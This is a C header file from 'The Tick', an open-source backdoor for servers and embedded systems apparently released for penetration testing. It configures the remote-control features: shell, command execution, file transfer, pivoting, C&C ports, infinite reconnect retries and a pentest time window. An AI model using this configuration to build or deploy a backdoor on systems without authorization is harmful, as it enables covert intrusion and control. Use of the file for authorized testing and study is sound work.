/*
 * The Tick, a simple backdoor for servers and embedded systems.
 * 
 * Developed by Mario Vilas, mvilas@gmail.com
 * http://www.github.com/MarioVilas/thetick
 * 
 * Originally released as open source by NCC Group Plc - http://www.nccgroup.com/
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#ifndef COMMON_H
#define COMMON_H

/*****************************************************************************/

// The following macros can be redefined with -D at the makefile level.
// They allow fine grained control on what features and settings to use at
// compile time. Removing features can be useful for embedded systems where
// you have limited memory and resources, but it can also be practical if you
// want to intentionally limit the functionality - for example, having a bot
// that can work as a proxy but doesn't grant any access to the host; or
// hardcoding connection parameters in the binary for situations where you
// have limited control over how the bot gets executed.

// Log to standard output. Use 1 to enable, 0 to disable.
#ifndef TICK_VERBOSE
#  define TICK_VERBOSE 1
#endif

// Feature control. Use 1 to enable, 0 to disable.
#ifndef   TICK_FEATURES_CRYPTO
#  define TICK_FEATURES_CRYPTO  1   /* protocol encryption */
#endif
#ifndef   TICK_FEATURES_DNS
#  define TICK_FEATURES_DNS     1   /* DNS resolution (globally) */
#endif
#ifndef   TICK_FEATURES_EXEC
#  define TICK_FEATURES_EXEC    1   /* exec command */
#endif
#ifndef   TICK_FEATURES_FILE
#  define TICK_FEATURES_FILE    1   /* push, pop, rm and chmod commands */
#endif
#ifndef   TICK_FEATURES_SHELL
#  define TICK_FEATURES_SHELL   1   /* shell command */
#endif
#ifndef   TICK_FEATURES_PIVOT
#  define TICK_FEATURES_PIVOT   1   /* pivot and proxy commands */
#endif
#ifndef   TICK_FEATURES_TIME_LIMIT
#  define TICK_FEATURES_TIME_LIMIT 1   /* pentesting time window */
#endif

// Configuration sources control. Use 1 to enable, 0 to disable.
// Ordered by precedence - the previous ones override the later ones.
#ifndef   TICK_CONFIG_USE_ARGV
#  define TICK_CONFIG_USE_ARGV  1   /* parse the command line */
#endif
#ifndef   TICK_CONFIG_USE_ENV
#  define TICK_CONFIG_USE_ENV   1   /* use environment variable */
#endif
#ifndef   TICK_CONFIG_USE_FILE
#  define TICK_CONFIG_USE_FILE  1   /* parse configuration file */
#endif

// Location of the configuration.
#ifndef   TICK_CONFIG_ENV_NAME
#  define TICK_CONFIG_ENV_NAME  TICK
#endif
//#ifndef   TICK_CONFIG_FILE_NAME
//#  define TICK_CONFIG_FILE_NAME /etc/tick.conf
//#endif

// Default configuration values. These are overridden in runtime.
//#ifndef TICK_CONFIG_HOSTNAME
//#  define TICK_CONFIG_HOSTNAME 127.0.0.1
//#endif
#ifndef     TICK_CONFIG_USE_SSL
#  if TICK_FEATURES_CRYPTO
#    define TICK_CONFIG_USE_SSL 1    /* enabled by default if SSL is allowed */
#  else
#    define TICK_CONFIG_USE_SSL 0   /* disabled by default is SSL is not allowed */
#  endif
#endif
#ifndef     TICK_CONFIG_PORT
#  if TICK_CONFIG_USE_SSL
#    define TICK_CONFIG_PORT 6666   /* default SSL port, 0 for no default */
#  else
#    define TICK_CONFIG_PORT 5555   /* default plain port, 0 for no default */
#  endif
#endif

// Default pentesting window.
// You can hard-code these in the Makefile if you want.
// Start and end dates as Unix timestamps (https://www.unixtimestamp.com/).
// Use 0 to disable either the start or end date check.
#ifndef TICK_CONFIG_TIME_LIMIT_START
#  define TICK_CONFIG_TIME_LIMIT_START 0
#endif
#ifndef TICK_CONFIG_TIME_LIMIT_END
#  if TICK_CONFIG_TIME_LIMIT_START > 0
#    define TICK_FEATURES_TIME_LIMIT_END (TICK_CONFIG_TIME_LIMIT_START+2592000)
#  else
#    define TICK_CONFIG_TIME_LIMIT_END 0
#  endif
#endif

// If connection to the C&C console fails, configure how many times to retry,
// and how long to wait between attempts.
#ifndef   TICK_CONNECT_RETRY_TIMES
#  define TICK_CONNECT_RETRY_TIMES -1   /* -1 for infinite */
#endif
#ifndef   TICK_CONNECT_RETRY_PAUSE
#  define TICK_CONNECT_RETRY_PAUSE 30   /* pause in seconds */
#endif

// Buffer sizes ahead.
// We keep fixed buffer sizes to ensure memory consumption is more or less
// fixed. This is especially important on embedded systems. Buffers of 1kb
// or less will be allocated in the stack, larger buffers in the heap.

// Buffer size for the protocol parser.
#ifndef   TICK_PARSER_BUFFER_SIZE
#  define TICK_PARSER_BUFFER_SIZE 1024
#endif

// Buffer size for the response of the "exec" command.
#ifndef   TICK_EXEC_BUFFER_SIZE
#  define TICK_EXEC_BUFFER_SIZE 4096
#endif

// Buffer size for reading the configuration file.
#ifndef   TICK_MAX_CONFIG_FILE_SIZE
#  define TICK_MAX_CONFIG_FILE_SIZE 1024
#endif

// Maximum level of nesting for configuration files.
// Defaults to 1 because I don't want nesting at all, but YMMV.
// If you set it to 0 it effectively disables config file parsing
// from the command line (but not if you hardcoded a filename).
#ifndef   TICK_MAX_CONFIG_FILE_DEPTH
#  define TICK_MAX_CONFIG_FILE_DEPTH 1
#endif

// A little sanity check. Not too smug, I hope.
#if !( defined (TICK_CONFIG_HOSTNAME) || TICK_CONFIG_USE_ARGV || TICK_CONFIG_USE_ENV || TICK_CONFIG_USE_FILE || TICK_CONFIG_USE_BIN )
#error No host to connect to and no configuration sources. How were you planning to connect it? :)
#endif
#if TICK_FEATURES_CRYPTO != TICK_CONFIG_USE_SSL
#error Not sure how this happened but we ended up with SSL both enabled and disabled at the same time :(
#endif

// More validation, this time with boring error messages.
// I can't come up with a witticism for every single one, that'd be overkill.
#if (! TICK_CONFIG_USE_ARGV) && defined (_WIN32)
#error Command line parsing cannot be disabled for Windows builds.
#endif
#if TICK_CONFIG_PORT < 0 || TICK_CONFIG_PORT > 0xFFFF
#error Invalid value for TICK_CONFIG_PORT
#endif
#if TICK_CONFIG_TIME_LIMIT_START < 0
#error Invalid value for TICK_CONFIG_TIME_LIMIT_START
#endif
#if TICK_CONFIG_TIME_LIMIT_END < 0
#error Invalid value for TICK_CONFIG_TIME_LIMIT_END
#endif
#if TICK_CONNECT_RETRY_PAUSE < 0
#error Invalid value for TICK_CONNECT_RETRY_PAUSE
#endif
#if TICK_PARSER_BUFFER_SIZE <= 0
#error Invalid value for TICK_PARSER_BUFFER_SIZE
#endif
#if TICK_EXEC_BUFFER_SIZE <= 0
#error Invalid value for TICK_EXEC_BUFFER_SIZE
#endif
#if TICK_MAX_CONFIG_FILE_SIZE <= 0
#error Invalid value for TICK_MAX_CONFIG_FILE_SIZE
#endif
#if TICK_MAX_CONFIG_FILE_DEPTH < 0
#error Invalid value for TICK_MAX_CONFIG_FILE_DEPTH
#endif

/*****************************************************************************/

#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>

#ifdef _WIN32

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winbase.h>
#include <fileapi.h>
#include <processthreadsapi.h>
#include <minwindef.h>
#include <synchapi.h>
#include <namedpipeapi.h>

// https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-getaddrinfo#support-for-getaddrinfo-on-windows-2000-and-older-versions
#include <wspiapi.h>

#define O_SYNC 0

#define SHUT_RD SD_RECEIVE
#define SHUT_WR SD_SEND
#define SHUT_RDWR SD_BOTH

#define MIN min
#define MAX max

#else

#include <netdb.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/statvfs.h>

#define O_BINARY 0
#define O_SEQUENTIAL 0

#endif

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

/*****************************************************************************/

// Log function. Wraps on printf, when disabled at compile time it's effectively a no-op.
#if TICK_VERBOSE
#include <stdio.h>
//#define LOG printf
#define LOG(...) fprintf(stderr, __VA_ARGS__)
#else
#define LOG(...)
#endif

#endif /* COMMON_H */
